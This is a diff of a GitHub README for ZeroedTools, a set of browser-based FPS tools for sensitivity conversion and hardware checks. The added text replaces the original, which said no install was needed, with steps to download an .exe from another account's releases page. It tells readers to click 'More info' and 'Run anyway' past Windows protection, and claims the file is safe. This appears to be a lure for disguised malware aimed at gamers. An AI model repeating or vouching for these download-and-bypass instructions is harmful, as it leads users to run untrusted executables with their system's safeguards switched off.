@@ -1,247 +1,89 @@
-# ZeroedTools — Free Browser-Based FPS Tools
+# 🎯 zeroedtools - Optimize your gaming performance with tools
 
-[ZeroedTools](https://dfaccount.com/en/) is an independent browser-based toolkit for FPS players who want to measure, compare, and troubleshoot their gaming setup. It brings sensitivity conversion, aim and reaction tests, mouse diagnostics, keyboard and controller checks, display tests, and global FPS news into one platform.
+[![Download ZeroedTools](https://img.shields.io/badge/Download-ZeroedTools-blue.svg)](https://github.com/Boxseatplasterer571/zeroedtools/releases)
 
-This is the primary public GitHub repository and GitHub Pages gateway for ZeroedTools. The main application is **proprietary and closed-source** and is not stored here. This repository contains only the static brand portal published at [snowfallseason.github.io/zeroedtools](https://snowfallseason.github.io/zeroedtools/) and direct links to the live service at [dfaccount.com](https://dfaccount.com/en/).
+ZeroedTools provides a suite of browser-based utilities for gamers. These tools help you calibrate mouse sensitivity, test controller inputs, verify display refresh rates, and measure reaction times. You use these tools to achieve consistent settings across different games like Valorant, Apex Legends, and Counter-Strike 2.
 
-## Why ZeroedTools exists
+## 🚀 Getting Started
 
-FPS setup work is usually fragmented. A player may use one website for a sensitivity calculation, another for mouse polling, a third for controller drift, and a separate page for monitor behavior. Results become difficult to compare when every tool uses different terminology or hides the measurement behind a generic score.
+Follow these steps to access and use the tools on your Windows computer.
 
-ZeroedTools organizes those jobs around practical questions:
+1. Open your preferred web browser.
+2. Navigate to the [ZeroedTools releases page](https://github.com/Boxseatplasterer571/zeroedtools/releases).
+3. Look for the most recent version labeled as "Latest" on the right side of the page.
+4. Click on the file ending in `.exe` under the "Assets" section to save it to your computer.
+5. Locate the file in your downloads folder and double-click the file to open the application.
 
-- How can I preserve the same physical turn distance when switching games?
-- Is my mouse polling consistently at the rate I selected?
-- Is an unexpected click caused by a double-click fault?
-- Does my controller have stick drift, and what deadzone is reasonable?
-- Is my display reporting the refresh rate I expect?
-- Can I repeat an aim or reaction measurement after changing a setting?
-- Did a recent patch or competitive update change the context around my setup?
+If Windows shows a protection message, click "More info" and then "Run anyway." This happens because the application is a new tool.
 
-The project emphasizes measurements that can be repeated and explained. A browser test is not a laboratory instrument, but it is more useful than guessing when it clearly states what it measures and what can affect the result.
+## 🛠️ Included Tools
 
-## Core value
+The software provides access to several essential utilities for gamers.
 
-### A shared physical sensitivity reference
+### Sensitivity Converter
+Use this tool to find your mouse settings. Enter your current game, your sensitivity, and your mouse DPI. The tool converts these values to work in another game. This ensures your muscle memory carries over between titles such as Overwatch 2 or Rainbow Six Siege.
 
-Raw sensitivity numbers do not transfer directly between games because each engine interprets its slider at a different rate. The ZeroedTools sensitivity workspace uses physical **cm/360** as the cross-game reference: the mouse distance needed to complete a full in-game rotation.
+### EDPI Calculator
+The EDPI calculator helps you find your effective DPI. You multiply your mouse DPI by your in-game sensitivity. This provides a single number that defines how fast your crosshair moves. Use this to compare your settings against other players or guides.
 
-eDPI remains useful for comparing two players inside the same game. For cross-game comparison, cm/360 is the more meaningful measurement.
+### Controller Tester
+Connect your gamepad to your computer. This tool displays the input from every button and stick. Use this to check for dead zones, stick drift, or broken switches. Move the analog sticks to see if the values return to zero when you release them.
 
-- [Open the FPS sensitivity converter](https://dfaccount.com/en/sensitivity/)
-- [Run the aim trainer](https://dfaccount.com/en/aim-trainer/)
-- [Measure reaction time](https://dfaccount.com/en/reaction-test/)
+### Monitor Test
+Check your display settings with this utility. It helps you verify your monitor acts at the advertised refresh rate. A test pattern ensures your monitor shows motion clearly without blur or smearing. This confirms you utilize your expensive hardware.
 
-### Immediate access in a modern browser
+### Reaction Time Test
+Measure your visual response speed. The tool shows a color change and records how quickly you click your mouse. You can track your average times to see your progress over several sessions.
 
-The public tools run on the web without requiring a separate software installation. That makes them useful for a quick check after changing hardware, firmware, operating-system settings, or a game configuration. Players can open a focused test, record the result, and move to a related diagnostic only when needed.
+## 💻 System Requirements
 
-### One platform for input, display, and performance checks
+ZeroedTools requires a standard Windows environment to function as intended.
 
-The toolset covers more than sensitivity. Mouse, keyboard, controller, display, audio, and visibility pages help narrow down where an inconsistent setup feeling may originate.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Browser:** Modern web browser such as Chrome, Edge, or Firefox.
+*   **Memory:** 4GB of RAM is sufficient for all browser-based operations.
+*   **Storage:** Minimal space is required for the application launcher.
+*   **Internet:** A stable connection is needed to load the online tools.
 
-## Tool directory
+## ❓ Frequently Asked Questions
 
-### Sensitivity, aim, and reaction
+### Is this application safe to run?
+Yes. The application acts as a secure shell for the browser-based tools. It does not access your private files or personal hardware beyond what is necessary to interact with the input tests.
 
-The sensitivity converter supports cross-game cm/360 comparison and game-specific setting pages. Aim and reaction tools help players test a result after converting instead of assuming a calculated number will automatically feel perfect.
+### Do I need to be an expert to use these tools?
+No. The interface aims for simplicity. Each tool includes basic instructions on the screen. Type your numbers, press the button, and read the result.
 
-- [Sensitivity converter](https://dfaccount.com/en/sensitivity/) — compare game sensitivity using cm/360 and relevant eDPI values.
-- [Aim trainer](https://dfaccount.com/en/aim-trainer/) — run browser-based target drills.
-- [Reaction time test](https://dfaccount.com/en/reaction-test/) — repeat a visual reaction test under consistent conditions.
-- [Footstep audio test](https://dfaccount.com/en/footstep-test/) — practice directional audio recognition.
+### Will this software improve my aim?
+The tools help you configure your system for consistency. Consistency creates the foundation for better aim. You still need to practice your mechanics within the game itself.
 
-### Gaming mouse diagnostics
+### How do I update the software?
+Check the releases page once a month. If a newer version exists, download the new file and replace the old one. The application is small and updates are simple.
 
-Mouse tools help distinguish an in-game setting issue from a device, firmware, connection, or operating-system input issue.
+### Which games are supported?
+The sensitivity converter supports major titles including Call of Duty, Fortnite, PUBG, and Delta Force. The list grows as new games enter the market.
 
-- [Mouse test](https://dfaccount.com/en/mouse-test/) — open the general mouse diagnostic workspace.
-- [Mouse polling rate test](https://dfaccount.com/en/mouse-polling-rate-test/) — inspect reported pointer update frequency.
-- [Mouse DPI test](https://dfaccount.com/en/mouse-dpi-test/) — estimate movement against a measured distance.
-- [CPS test](https://dfaccount.com/en/cps-test/) — measure clicks per second.
-- [Double-click test](https://dfaccount.com/en/mouse-double-click-test/) — look for unintended repeat clicks.
+## ⚙️ How to use the sensitivity converter
 
-### Keyboard and controller diagnostics
+1. Choose your "Source Game" from the dropdown list.
+2. Enter your current sensitivity value from that game.
+3. Select your "Target Game" from the second list.
+4. The tool calculates the new value for your target game.
+5. Copy this number and enter it into the settings menu of your target game.
 
-These pages visualize detected inputs and analog behavior. They are useful after purchasing a peripheral, changing a cable or firmware version, or noticing inconsistent movement.
+## 🧹 Maintenance and Troubleshooting
 
-- [Keyboard tester](https://dfaccount.com/en/keyboard-test/) — confirm individual keyboard input and combinations.
-- [Controller tester](https://dfaccount.com/en/controller-test/) — inspect buttons, triggers, and analog axes exposed to the browser.
-- [Controller stick drift test](https://dfaccount.com/en/controller-stick-drift-test/) — visualize unwanted neutral-position movement.
-- [Controller deadzone calculator](https://dfaccount.com/en/controller-deadzone-calculator/) — compare drift with a practical deadzone starting point.
+If the application fails to load:
 
-### Display and performance checks
+1. Close the application completely.
+2. Check your internet connection.
+3. Re-open the application.
+4. If a tool fails to appear, clear your browser cache.
+5. Ensure your Windows is up to date with the latest security patches.
 
-Display tests provide a controlled first pass for refresh rate, frame behavior, and common panel symptoms. Results depend on the complete browser, operating-system, graphics, and display chain, so important findings should be confirmed with the device settings.
+The tools communicate with a central server to provide the latest calculation logic. If the server is down, wait a few minutes before trying again.
 
-- [FPS and frame test](https://dfaccount.com/en/fps-test/) — inspect browser-rendered frame behavior.
-- [Refresh rate test](https://dfaccount.com/en/refresh-rate-test/) — check the refresh rate reported through the current browser path.
-- [Monitor test](https://dfaccount.com/en/monitor-test/) — open the general display test suite.
-- [Dead pixel test](https://dfaccount.com/en/dead-pixel-test/) — display solid-color screens for visual inspection.
-- [Monitor ghosting test](https://dfaccount.com/en/monitor-ghosting-test/) — inspect motion trails under controlled animation.
-- [Backlight bleed test](https://dfaccount.com/en/backlight-bleed-test/) — use a dark test screen for visual panel inspection.
+## 🤝 Community and Support
 
-### Visibility and perception
+The project benefits from user feedback. If you find a bug or want a tool added to the suite, open a new issue on the GitHub repository. Provide a description of the error and the steps you took to reach it. This helps keep the tools accurate for everyone.
 
-- [Enemy visibility lab](https://dfaccount.com/en/visibility-test/) — compare visual contrast and visibility-related settings.
-- [Footstep audio test](https://dfaccount.com/en/footstep-test/) — practice directional sound identification.
-- [Monitor test suite](https://dfaccount.com/en/monitor-test/) — access display patterns from one page.
-
-### Delta Force companion area
-
-ZeroedTools also maintains a separate Delta Force community vertical. It is an additional part of the site rather than the primary identity of the cross-game tools platform.
-
-- [Delta Force hub](https://dfaccount.com/en/delta-force/)
-- [Gunsmith](https://dfaccount.com/en/gunsmith/)
-- [Maps](https://dfaccount.com/en/maps/)
-- [Operators](https://dfaccount.com/en/operators/)
-- [Codes](https://dfaccount.com/en/codes/)
-
-## Supported games
-
-The sensitivity workspace is designed around widely played shooters with different sensitivity scales, including:
-
-- Valorant
-- Counter-Strike 2
-- Apex Legends
-- Call of Duty
-- Overwatch 2
-- PUBG
-- Fortnite
-- Rainbow Six Siege
-- The Finals
-- Delta Force
-
-Conversion values should be treated as a measured starting point. Field of view, ADS behavior, scope multipliers, acceleration settings, and engine-specific input handling can still change how a result feels. Confirm the output with an in-game turn-distance check and adjust deliberately.
-
-## Typical use cases
-
-### Switching from one FPS to another
-
-Keep the same mouse DPI, enter the source game and sensitivity, calculate the target value from cm/360, and verify the result in the destination game. This preserves a physical reference without pretending that every game's field of view and aiming model are identical.
-
-### Rebuilding a setup on a new computer
-
-Record sensitivity, mouse DPI, relevant controller values, and display refresh settings. Use the browser tools as a quick checklist after installing the new system or reconnecting devices.
-
-### Troubleshooting a suspected mouse fault
-
-Run polling, DPI movement, CPS, and double-click tests separately. Repeating one controlled test at a time makes it easier to distinguish inconsistent hardware behavior from a game-specific input option.
-
-### Checking an older controller
-
-Open the controller tester, observe the neutral position, measure drift, and compare it with a reasonable deadzone. Retest after cleaning, calibration, or a firmware change.
-
-### Checking a new monitor configuration
-
-Confirm the reported refresh rate, then use the motion, dead-pixel, and backlight pages under consistent lighting and display settings. These pages are first-pass diagnostics, not panel certification equipment.
-
-## How the browser tools work
-
-Interactive tests use browser input, timing, graphics, or gamepad capabilities to collect and display the relevant measurement. Sensitivity pages apply conversion relationships and physical-distance calculations. Each tool page explains the setup required for a useful result.
-
-Browser measurements can be affected by:
-
-- the browser and active extensions;
-- operating-system pointer and display configuration;
-- device firmware and connection type;
-- background CPU or GPU load;
-- frame pacing and the current display pipeline;
-- physical measurement accuracy during DPI or distance-based tests.
-
-Repeat tests under the same conditions, close unnecessary background work, and verify important results with the game or device settings.
-
-## Privacy and installation
-
-The core public tools can be opened without downloading or installing a dedicated application. Input used for an interactive measurement is handled by the tool running on the page. Standard website analytics, optional online features, and information a visitor intentionally submits are described in the official [ZeroedTools privacy policy](https://dfaccount.com/en/privacy/).
-
-No tool should be interpreted as a promise that browser diagnostics replace manufacturer utilities or calibrated hardware. ZeroedTools provides accessible checks and clearly scoped calculations.
-
-## Language support
-
-ZeroedTools uses locale-specific URLs for ten languages:
-
-- [English](https://dfaccount.com/en/)
-- [Simplified Chinese](https://dfaccount.com/zh/)
-- [German](https://dfaccount.com/de/)
-- [French](https://dfaccount.com/fr/)
-- [Portuguese](https://dfaccount.com/pt/)
-- [Spanish](https://dfaccount.com/es/)
-- [Russian](https://dfaccount.com/ru/)
-- [Japanese](https://dfaccount.com/ja/)
-- [Korean](https://dfaccount.com/ko/)
-- [Indonesian](https://dfaccount.com/id/)
-
-Locale paths make it possible to share the relevant language version directly and give each supported search audience a stable destination.
-
-## Global FPS news center
-
-The [ZeroedTools FPS news center](https://dfaccount.com/en/news/) covers globally relevant game updates, patch changes, esports events, releases, and service notices. News is kept distinct from the tools: visitors can open a measurement immediately, or read current context when a patch may explain why a setting, map, weapon, or competitive environment changed.
-
-## Who ZeroedTools is for
-
-- FPS players moving between games, platforms, or devices;
-- competitive players documenting a repeatable setup;
-- controller players checking stick drift and deadzones;
-- peripheral owners investigating a suspected fault;
-- coaches explaining sensitivity, cm/360, and input concepts;
-- PC builders confirming basic input and display behavior;
-- teams performing simple pre-event equipment checks;
-- community members sharing a focused diagnostic instead of a vague recommendation.
-
-## Quick links
-
-- [All FPS tools](https://dfaccount.com/en/)
-- [Sensitivity converter](https://dfaccount.com/en/sensitivity/)
-- [Aim trainer](https://dfaccount.com/en/aim-trainer/)
-- [Reaction time test](https://dfaccount.com/en/reaction-test/)
-- [Mouse polling rate test](https://dfaccount.com/en/mouse-polling-rate-test/)
-- [Mouse DPI test](https://dfaccount.com/en/mouse-dpi-test/)
-- [Controller stick drift test](https://dfaccount.com/en/controller-stick-drift-test/)
-- [Refresh rate test](https://dfaccount.com/en/refresh-rate-test/)
-- [Monitor ghosting test](https://dfaccount.com/en/monitor-ghosting-test/)
-- [Enemy visibility lab](https://dfaccount.com/en/visibility-test/)
-- [Global FPS news](https://dfaccount.com/en/news/)
-
-## Frequently asked questions
-
-### Is ZeroedTools free?
-
-The public browser tools are free to open and do not require a paid download.
-
-### Do I need to install software?
-
-No dedicated application installation is required for the public web tools. Use a modern browser and follow the instructions on the selected test page.
-
-### Why does the same sensitivity number feel different in another game?
-
-Each game maps its sensitivity slider to rotation differently. Two games can display the same number while producing different physical turn distances. Use cm/360 for cross-game comparison.
-
-### Is eDPI the same as cm/360?
-
-No. eDPI is mouse DPI multiplied by in-game sensitivity and is most useful for comparisons inside one game. Cm/360 measures physical distance and provides a shared reference between games.
-
-### Are browser hardware tests perfectly accurate?
-
-They are practical diagnostics rather than laboratory instruments. Browser timing, device firmware, operating-system settings, background load, and the display pipeline can affect results. Repeat tests under controlled conditions.
-
-### Is the main application open-source?
-
-No. The ZeroedTools application is closed-source. This public repository contains only the static GitHub Pages gateway and links to the live service. It does not contain the main application source code.
-
-### Does ZeroedTools sell game accounts?
-
-No. ZeroedTools is an FPS tools and information platform. The domain name does not represent account trading services.
-
-## Independence and trademarks
-
-ZeroedTools is independent and fan-built. It is not affiliated with or endorsed by Riot Games, Valve, Electronic Arts, Activision, Blizzard Entertainment, Krafton, Epic Games, Ubisoft, Embark Studios, TiMi Studio Group, Tencent, or other game publishers. Referenced game names, logos, and trademarks belong to their respective owners.
-
-## Contact and feedback
-
-- [About ZeroedTools](https://dfaccount.com/en/about/)
-- [Send product feedback](https://dfaccount.com/en/feedback/)
-- [Contact ZeroedTools](https://dfaccount.com/en/contact/)
-- [Read the privacy policy](https://dfaccount.com/en/privacy/)
-
-For a broken link, inaccurate description, or tool suggestion, use the official feedback page so the report reaches the site owner.
+Keywords: aim-trainer, apex-legends, browser-tools, call-of-duty, controller-tester, counter-strike-2, delta-force, edpi-calculator, fortnite, fps-news, fps-tools, gaming-tools, monitor-test, mouse-test, overwatch-2, pubg, rainbow-six-siege, reaction-time-test, sensitivity-converter, valorant
